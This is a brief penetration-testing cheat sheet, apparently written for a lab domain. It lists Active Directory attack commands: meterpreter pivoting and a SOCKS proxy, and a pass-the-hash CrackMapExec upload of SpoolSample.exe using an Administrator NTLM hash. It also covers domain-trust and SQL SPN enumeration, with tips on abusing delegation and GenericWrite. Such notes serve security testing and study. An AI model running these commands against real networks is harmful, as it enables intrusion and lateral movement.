# Cheat Sheet - Utilities

## Table of Contents

* [Tips](#Tips)
* [Setup Proxy](#SetupProxy)
* [Check for trusted domains](#Trusted)
* [Upload files using CrackMapExec](#CrackMapExec)
* [List scheduled tasks](#ListTasks)
* [Enumerate SQL Server](#EnumSQLServer)

### Tips<a name="Tips"></a>

* If the useraccountcontrol had TRUSTED_FOR_DELEGATION mean that the machin is configured to use unconstrained delegation.

* Generic Write can be exploited using PowerMad methode.

### Setup Proxy<a name="SetupProxy"></a>

```bash
meterpreter > run autoroute -s 172.16.112.151
auxiliary/server/socks_proxy
/etc/proxychains.conf
/etc/proxychains4.conf

ssh v0lk3n@192.168.x.x -D 9050  
```

### Check for trusted domains<a name="Trusted"></a>

```bash
nltest /trusted_domains
```

### Upload files using CrackMapExec<a name="CrackMapExec"></a>

```bash
proxychains crackmapexec smb -d dev.sinhack.com -u Administrator -H aad3b435b51404eeaad3b435b51404ee:525ca4cd9965c41b34a453259403f24d --put-file /home/Tools/SpoolSample.exe 
```


### List scheduled tasks (Windows)<a name="ListTasks"></a>

```bash
schtasks /query
```

### Enumerate SQL Server (Windows)<a name="EnumSQLServer"></a>

```bash
setspn -T sinhack.com -Q MSSQLSvc/*
```
